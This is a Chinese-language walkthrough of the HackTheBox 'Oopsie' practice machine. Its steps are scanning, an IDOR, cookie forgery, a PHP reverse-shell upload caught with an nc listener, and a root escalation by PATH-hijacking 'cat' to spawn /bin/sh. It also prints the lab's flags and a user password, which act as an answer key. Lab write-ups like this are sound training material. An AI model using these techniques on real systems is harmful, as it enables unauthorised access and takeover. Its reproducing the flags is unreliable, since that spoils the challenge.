# OOPSIE 

**平台**：HackTheBox

**难度**：Very Easy

**OS**：Linux

**靶机IP：**10.129.95.191

---

**端口扫描**：

```bash
nmap -sC -sV -T4 -Pn 10.129.95.191 
```

![nmapscan](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\nmapscan.png)

**初始侦察**：

![recon](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\recon1.png)

![admininfo](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\admininfo.png)

通过手动翻阅网页，可以收集到[admin@megacorp.com]

可初步推断管理员用户名为admin

![sitemap](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\sitemap.png) 

通过burpsuite - target - sitemap可以找到/cdn-cgi/login的隐藏登录界面

![login](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\Login.png)

访问，Login as Guest可作为访客访问到后台管理界面

![guest](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\guest.png)

Accont 下的url为 accounts&id=2 , 通过修改id值看看能不能触发idor

![admin](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\admin.png)

成功！得到了管理员的AccessID和Name，和猜测相同为admin

![image-20260528131112681](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\cookie.png)

通过修改cookie为admin 34322可以未授权访问Uploads页面，接下来尝试恶意上传后门

```bash
cp /usr/share/webshells/php/php-reverse-shell.php . #获取反弹shell 
```

![shell](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\shell.png)

修改shell的内容需要改为攻击机的ip 及希望的监听端口 以4443演示

![uploadshell](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\uploadshell.png)

![uploadshell](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\uploadshell2.png)

上传成功！现在需要找到文件上传位置

```bash
gobuster dir -u http://10.129.95.191 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

![gobuster](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\gobusterscan.png)

```bash
nc -lvnp 4443
```

开启nc监听后直接访问/uploads/php-reverse-shell.php

![nc](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\netcat.png)

我们成功get到www-data的shell可以开始访问网页的文件，找有没有账号密码了

![image-20260528132328951](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\userflag.png)

Get user flag ： f2c74ee8db7983851ab2a96a44eb7981

![robertpasswd](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\robertpasswd.png)

查阅/var/www/html/cdn-cgi/login/db.php 获取robert的凭证

robert : M3g4C0rpUs3r!

可以通过ssh连接

![ssh](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\ssh.png)

通过 `id`可以看到robert属于bugtracker组

![image-20260528133051594](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\bugtracker.png)

通过

```bash
find / -group bugtracker 2>/dev/null
```

找到一个叫bugtracker的文件在/usr/bin目录下，我们可以执行它

![image-20260528132717819](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\bugtracker2.png)

运行bugtracker 查询1 ， 100

发现查询100的时候，出现错误 `cat: /root/reports/100: No such file or directory`

表示bugtracker是通过`/root`目录下的`cat`命令来执行的

那我们只需要替换`cat`命令，来生成一个shell，就能成功提权为root

要替换它，首先在一个带有写权限的目录里创建一个名为 `cat` 的文件，比如 `/tmp`

然后我们添加一行，生成一个 shell 到 `cat` 文件中，检查结果

```bash
echo /bin/sh >> /tmp/cat
chmod 777 /tmp/cat #更改权限，使可执行
```

![root](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\root.png)

提权成功

Get root flag ：af13b0bee69f8a877c3faf667f7beacf

 ![image-20260528133925289](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\rootflag.png)

---

# HackTheBox Q&A

![QA](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\Q&A.png)

![QA2](C:\Users\33103\Documents\GitHub\Writeups\HTB\Starting Point\OOPSIE\images\Q&A2.png)

---

<div align="center">
**Writeup By YRww**

**Keep Hacking**

</div>



